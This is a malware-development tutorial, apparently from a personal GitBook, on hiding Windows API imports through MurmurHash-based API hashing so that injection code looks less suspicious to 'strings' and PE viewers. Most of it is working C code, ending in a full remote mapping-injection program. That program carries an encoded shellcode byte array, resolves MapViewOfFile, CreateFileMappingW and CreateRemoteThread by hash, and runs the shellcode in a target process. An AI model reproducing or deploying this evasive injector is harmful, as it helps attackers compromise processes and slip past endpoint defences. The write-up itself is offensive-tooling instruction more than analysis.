# API Hashing

## Introduction

As we all know that the IAT of a binary gives a vague idea of what the file is capable of. And a simple way to avoid this is by using a technique like API Hashing / String Hashing. +1 since they also can't use `strings` to take a peek at us.

## Analyzing Mapping Injection

I'll start with running `strings` on the Mapping Injection implementation which can be found [here](https://github.com/ZzN1NJ4/Malware-Development/blob/main/Mapping%20Injection/main.c).

```
> strings MappingInjection.exe
......
Stack around _alloca corrupted
RegOpenKeyExW
RegQueryValueExW
RegCloseKey
PDBOpenValidate5
RSDS
CloseHandle
GetLastError
WaitForSingleObject
Sleep
GetCurrentProcess
GetCurrentProcessId
CreateThread
CreateRemoteThread
OpenProcess
CreateFileMappingW
MapViewOfFile
UnmapViewOfFile
KERNEL32.dll
MapViewOfFileNuma2
api-ms-win-core-memory-l1-1-5.dll
memcpy
__C_specific_handler
......
wcscpy_s
ucrtbased.dll
GetCurrentThreadId
IsDebuggerPresent
RaiseException
MultiByteToWideChar
WideCharToMultiByte
...
```

We can see a lot of stuff here, keeping aside the variables/print messages/etc, we also see a list of Windows API being used here like the `MapViewOfFile` (You might see some extra APIs at the bottom but that's because CRT included them). A better way would be to look at it using something like PE bear and we see a list of APIs being used.

<figure><img src="../../.gitbook/assets/Pasted image 20251226233703.png" alt=""><figcaption></figcaption></figure>

But what if we want them to suffer more, then we can just use API hashing instead and avoid the string `MapViewOfFile` to display anywhere in the code, so that it looks a little less suspiciuos.

## Simple Explanation

What we are going to do is basically Hash required functions in `Kernel32.dll` or any other module according to our needs, and then note their hash, then in our Malware, when we want to get the base address of that function, instead of matching the string, we will match with the hash value of the modules and get the ones that match with it.

Some of the common hashing techniques include

* djb2
* CRC32
* FNV-1a
* SuperFastHash
* LoseLose
* Murmur

and many more, the source code of which could be found [here](https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringLoseLose.cpp), we can even develop our own custom hashing technique. There's also this [github](https://github.com/AbdouRoumi/Hasherama) which does the job of printing the hashes in a few different format.

## Generating Hashes

I'll go with the ~~LoseLose~~ (LoseLose is weak and susceptible to hash collision, I found it the hard way) MurMur Implementation and generate the hashes for necessary winapi for running Mapping Injection. Here's the C code to get the necessary hashes

```c
#include "helper.h"

INT32 HashStringMurmurA(_In_ LPCSTR String)
{
	INT  Length = (INT)StringLengthA(String);
	UINT32 hash = 0;
	PUINT32 Tmp;
	SIZE_T  Idx;
	UINT32  Cnt;

	if (Length > 3)
	{
		Idx = Length >> 2;
		Tmp = (PUINT32)String;

		do {
			Cnt = *Tmp++;

			Cnt *= 0xcc9e2d51;
			Cnt = (Cnt << 15) | (Cnt >> 17);
			Cnt *= 0x1b873593;

			hash ^= Cnt;
			hash = (hash << 13) | (hash >> 19);
			hash = (hash * 5) + 0xe6546b64;

		} while (--Idx);

		String = (PCHAR)Tmp;
	}

	if (Length & 3)
	{
		Idx = Length & 3;
		Cnt = 0;
		String = &String[Idx - 1];

		do {
			Cnt <<= 8;
			Cnt |= *String--;

		} while (--Idx);

		Cnt *= 0xcc9e2d51;
		Cnt = (Cnt << 15) | (Cnt >> 17);
		Cnt *= 0x1b873593;
		hash ^= Cnt;
	}

	hash ^= Length;
	hash ^= hash >> 16;
	hash *= 0x85ebca6b;
	hash ^= hash >> 13;
	hash *= 0xc2b2ae35;
	hash ^= hash >> 16;

	return hash;

}

int main() {
	LPCSTR strings[5] = { "MapViewOfFile", "CreateFileMappingW", "CreateRemoteThread", "UnmapViewOfFile", "MapViewOfFile2" };
	
	//ULONG hashed = HashStringMurmurA(strings[0]);
	//info("MapViewOfFile: 0x%X", hashed);

	ULONG hashes[5] = { 0x00 };
	for (size_t i = 0; i < 5; i++) {
		//info("debug: 0x%s", strings[i]);
		hashes[i] = HashStringMurmurA(strings[i]);
	}
	
	printf("          PRINTING API HASHES               \n");
	printf("============================================\n");
	info("MapViewOfFile: 0x%X", hashes[0]);
	info("CreateFileMappingW: 0x%X", hashes[1]);
	info("UnmapViewOfFile: 0x%X", hashes[2]);
	info("MapViewOfFileNuma2: 0x%X", hashes[3]);
	info("CreateRemoteThread: 0x%X", hashes[4]);
	printf("============================================\n");

	return 0;
}
```

Running the code will give me this

```
          PRINTING API HASHES
============================================
[*] MapViewOfFile: 0xE3C14D6C
[*] CreateFileMappingW: 0x22CD259E
[*] UnmapViewOfFile: 0x2A3057D5
[*] MapViewOfFileNuma2: 0xD4D29AA7
[*] CreateRemoteThread: 0x2A598A4A
============================================
```

## API Hashing

Okay so we have the necessary hashes, now we need a way to get our necessary function by it's hash value, I've written a small code which is pretty similar to the `GetProcAddress` instead that it calculates the hash for all of the exports and returns the VA for the export having the same hash value.

```c
VOID* getFuncByHash(HMODULE hMod, ULONG hash) {
	BYTE* pBase = (BYTE*)hMod;
	IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)pBase;
	IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)
		(pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addrNames = (DWORD*)(pBase + exp->AddressOfNames);
	WORD* addrOrdinals = (WORD*)(pBase +exp->AddressOfNameOrdinals);
	DWORD* addrFunctions = (DWORD*)(pBase + exp->AddressOfFunctions);

	LPCSTR lpName = "";

	for (DWORD i = 0; i < exp->NumberOfNames; i++) {
		lpName = pBase + addrNames[i];
		if (HashStringMurmurA(lpName) == hash) {
			WORD ord = addrOrdinals[i];
			return (VOID*)(pBase + addrFunctions[ord]);
		}
		//printf("%s   |   0x%X\n", lpName, HashStringMurmurA(lpName));
		//if (i == 10) break;
	}
	return NULL;
}
```

Then I'll check the value for a single API to make sure we are getting the correct API, and then perform the Injection.

```c
	pMapViewOfFile fnMapViewOfFile = (pMapViewOfFile)getFuncByHash(hKernel, 0xE3C14D6C);
	pMapViewOfFile fnRealMapViewOfFile = (pMapViewOfFile)(GetProcAddress(hKernel, "MapViewOfFile"));
	info(" here: 0x%p | 0x%p", fnRealMapViewOfFile, fnMapViewOfFile);
	getchar();
```

I can see that both the hash value matches and looking at x64dbg, I can confirm it is for the `MapViewOfFile` API.&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20251228073321.png" alt=""><figcaption></figcaption></figure>

Now I just need to get all the functions and the rest of the process is similar to that of Mapping Injection. Here I'll just perform the Remote Mapping Injection instead of both Local & Remote.

```c
	pMapViewOfFile fnMapViewOfFile = (pMapViewOfFile)getFuncByHash(hKernel, 0xE3C14D6C);
	pCreateFileMappingW fnCreateFileMappingW = (pCreateFileMappingW)getFuncByHash(hKernel, 0x22CD259E);
	pUnmapViewOfFile fnUnmapViewOfFile = (pUnmapViewOfFile)getFuncByHash(hKernel, 0x2A3057D5);
	pMapViewOfFileNuma2 fnMapViewOfFileNuma2 = (pMapViewOfFileNuma2)getFuncByHash(hKernelbase, 0xD4D29AA7);
	pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread)getFuncByHash(hKernel, 0x2A598A4A);
	...
```

Only a slight change would be while calling the `MapViewOfFileNuma2` function, looking at the MSDN for `MapViewOfFile2`, Microsoft recommends calling the numa2 with the final parameter being set to `NUMA_NO_PREFERRED_NODE`. The full source can be found at the end of the page.&#x20;

After everything has been done, I'll check the pe binary again in PE-bear and this time, we don't see any of the Mapping related APIs which we used.&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20251228073846.png" alt=""><figcaption></figcaption></figure>

Again, the extra APIs are due to CRT adding some of their own, if we configure it to be build for a `Release`, then we see that some of the API have been removed lowering the count, although to completely eliminate them, we would have to remove CRT (as shown [here](../independent-malware.md)).

## Pitfall

So Initially I thought of using the `LoseLoseA` for hashing, but the program wasn't working and after some debugging, I realized that this function is susceptible to hash collision. Both the `MapViewOfFileNuma2` and the `GetPackageContext` function have the same hash value of `0x6B1`, and since the `GetPackageContext` function appears first, I was getting the VA for that. Fortunately, I debugged it well to point out the mistake early.&#x20;

If you are trying to use a hashing function, or creating your own, then make sure it is a strong hash and isn't susceptible to something like hash collision.

## Source Code

This can also be found on my github [here](https://github.com/ZzN1NJ4/Malware-Development/blob/main/API-Hashing/main.c).

```c
#include "helper.h"

// necessary for MapViewOfFileNuma2
// including memoryapi.h didn't help
// comment out since we are dynamically getting the VA
// #pragma comment(lib, "onecore.lib")

CONST UCHAR shellcode[] = {
	0xeb, 0x27, 0x5b, 0x53, 0x5f, 0xb0, 0xec, 0xfc, 0xae, 0x75, 0xfd, 0x57, 0x59, 0x53, 0x5e, 0x8a,
	0x06, 0x30, 0x07, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc6, 0x66, 0x81, 0x3f, 0xbf, 0x2f, 0x74, 0x07,
	0x80, 0x3e, 0xec, 0x75, 0xea, 0xeb, 0xe6, 0xff, 0xe1, 0xe8, 0xd4, 0xff, 0xff, 0xff, 0x14, 0xec,
	0xe8, 0x5c, 0x97, 0xf0, 0xe4, 0xfc, 0xd4, 0x14, 0x14, 0x14, 0x55, 0x45, 0x55, 0x44, 0x46, 0x45,
	0x42, 0x5c, 0x25, 0xc6, 0x71, 0x5c, 0x9f, 0x46, 0x74, 0x5c, 0x9f, 0x46, 0x0c, 0x5c, 0x9f, 0x46,
	0x34, 0x5c, 0x9f, 0x66, 0x44, 0x5c, 0x1b, 0xa3, 0x5e, 0x5e, 0x59, 0x25, 0xdd, 0x5c, 0x25, 0xd4,
	0xb8, 0x28, 0x75, 0x68, 0x16, 0x38, 0x34, 0x55, 0xd5, 0xdd, 0x19, 0x55, 0x15, 0xd5, 0xf6, 0xf9,
	0x46, 0x55, 0x45, 0x5c, 0x9f, 0x46, 0x34, 0x9f, 0x56, 0x28, 0x5c, 0x15, 0xc4, 0x9f, 0x94, 0x9c,
	0x14, 0x14, 0x14, 0x5c, 0x91, 0xd4, 0x60, 0x73, 0x5c, 0x15, 0xc4, 0x44, 0x9f, 0x5c, 0x0c, 0x50,
	0x9f, 0x54, 0x34, 0x5d, 0x15, 0xc4, 0xf7, 0x42, 0x5c, 0xeb, 0xdd, 0x55, 0x9f, 0x20, 0x9c, 0x5c,
	0x15, 0xc2, 0x59, 0x25, 0xdd, 0x5c, 0x25, 0xd4, 0xb8, 0x55, 0xd5, 0xdd, 0x19, 0x55, 0x15, 0xd5,
	0x2c, 0xf4, 0x61, 0xe5, 0x58, 0x17, 0x58, 0x30, 0x1c, 0x51, 0x2d, 0xc5, 0x61, 0xcc, 0x4c, 0x50,
	0x9f, 0x54, 0x30, 0x5d, 0x15, 0xc4, 0x72, 0x55, 0x9f, 0x18, 0x5c, 0x50, 0x9f, 0x54, 0x08, 0x5d,
	0x15, 0xc4, 0x55, 0x9f, 0x10, 0x9c, 0x5c, 0x15, 0xc4, 0x55, 0x4c, 0x55, 0x4c, 0x4a, 0x4d, 0x4e,
	0x55, 0x4c, 0x55, 0x4d, 0x55, 0x4e, 0x5c, 0x97, 0xf8, 0x34, 0x55, 0x46, 0xeb, 0xf4, 0x4c, 0x55,
	0x4d, 0x4e, 0x5c, 0x9f, 0x06, 0xfd, 0x43, 0xeb, 0xeb, 0xeb, 0x49, 0x5c, 0xae, 0x15, 0x14, 0x14,
	0x14, 0x14, 0x14, 0x14, 0x14, 0x5c, 0x99, 0x99, 0x15, 0x15, 0x14, 0x14, 0x55, 0xae, 0x25, 0x9f,
	0x7b, 0x93, 0xeb, 0xc1, 0xaf, 0xf4, 0x09, 0x3e, 0x1e, 0x55, 0xae, 0xb2, 0x81, 0xa9, 0x89, 0xeb,
	0xc1, 0x5c, 0x97, 0xd0, 0x3c, 0x28, 0x12, 0x68, 0x1e, 0x94, 0xef, 0xf4, 0x61, 0x11, 0xaf, 0x53,
	0x07, 0x66, 0x7b, 0x7e, 0x14, 0x4d, 0x55, 0x9d, 0xce, 0xeb, 0xc1, 0x77, 0x75, 0x78, 0x77, 0x3a,
	0x71, 0x6c, 0x71, 0x14, 0xbf, 0x2f
};


VOID* getFuncByHash(HMODULE hMod, ULONG hash) {
	BYTE* pBase = (BYTE*)hMod;
	IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)pBase;
	IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)
		(pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addrNames = (DWORD*)(pBase + exp->AddressOfNames);
	WORD* addrOrdinals = (WORD*)(pBase +exp->AddressOfNameOrdinals);
	DWORD* addrFunctions = (DWORD*)(pBase + exp->AddressOfFunctions);

	LPCSTR lpName = "";

	for (DWORD i = 0; i < exp->NumberOfNames; i++) {
		lpName = pBase + addrNames[i];
		if (HashStringMurmurA(lpName) == hash) {
			WORD ord = addrOrdinals[i];
			return (VOID*)(pBase + addrFunctions[ord]);
		}
		//printf("%s   |   0x%X\n", lpName, HashStrsingLoseLoseA(lpName));
		//if (i == 10) break;
	}
	return NULL;
}


int main(int argc, char* argv[]) {

	if (argc < 2) {
		info("Usage: %s [pid]", argv[0]);
		exit(0);
	}

	DWORD pid = atoi(argv[1]);
	HANDLE hKernel = GetModuleHandle(L"KERNEL32.DLL");
	HANDLE hKernelbase = GetModuleHandle(L"KERNELBASE.DLL");

	// Get the functions by their hashes
	// MapViewOfFile2 doesn't actually exists and is just a wrapper function
	// Acc. to MSDN, it's the same as calling MapViewOfFileNuma2
	pMapViewOfFile fnMapViewOfFile = (pMapViewOfFile)getFuncByHash(hKernel, 0xE3C14D6C);
	pCreateFileMappingW fnCreateFileMappingW = (pCreateFileMappingW)getFuncByHash(hKernel, 0x22CD259E);
	pUnmapViewOfFile fnUnmapViewOfFile = (pUnmapViewOfFile)getFuncByHash(hKernel, 0x2A3057D5);
	pMapViewOfFileNuma2 fnMapViewOfFileNuma2 = (pMapViewOfFileNuma2)getFuncByHash(hKernelbase, 0xD4D29AA7);
	pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread)getFuncByHash(hKernel, 0x2A598A4A);

	HANDLE hFileMap, hProcess;
	PVOID pMapLocal = NULL, pMapRemote = NULL;
	SIZE_T szCode = sizeof(shellcode);

	hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess) {
		warn("OpenProcess failed  @--0x%X", GetLastError());
		return FALSE;
	}
	info("Got Handle to Process");

	hFileMap = fnCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, szCode, NULL);
	if (!hFileMap) {
		warn("CreateFileMapping failed  @--0x%x", GetLastError());
		return FALSE;
	}

	// since we are not running pMapLocal, we dont need FILE_MAP_EXECUTE
	pMapLocal = fnMapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, szCode);
	if (!pMapLocal) {
		warn("MapViewOfFile failed  @--0x%X", GetLastError());
		return FALSE;
	}

	memcpy(pMapLocal, shellcode, szCode);

	info("Mapped shellcode to local process file");

	pMapRemote = fnMapViewOfFileNuma2(hFileMap, hProcess, NULL, NULL, szCode, NULL, PAGE_EXECUTE_READWRITE, NUMA_NO_PREFERRED_NODE);
	//pMapRemote = MapViewOfFile2(hFileMap, hProcess, NULL, NULL, szCode, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemote == NULL) {
		warn("Error Mapping to Remote Process  @--0x%X", GetLastError());
		return FALSE;
	}

	HANDLE hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pMapRemote, NULL, 0, NULL);
	if (!hThread) {
		warn("CreateRemoteThread failed  @--0x%X", GetLastError());
		return FALSE;
	}

	cool("Created Remote Thread to run Shellcode");

	WaitForSingleObject(hThread, 5000);

	CloseHandle(hKernel); CloseHandle(hFileMap);  CloseHandle(hProcess);
	fnUnmapViewOfFile(pMapLocal); fnUnmapViewOfFile(pMapRemote);

	return 0;
}
```

## Conclusion

That's it for now, I know I have gone hiatus for a while, but now I'll be more active and keep posting. I'll also write a Rust implementation soon soon.

## References

{% embed url="https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringLoseLose.cpp" %}

{% embed url="https://github.com/AbdouRoumi/Hasherama" fullWidth="false" %}

{% embed url="https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2" %}
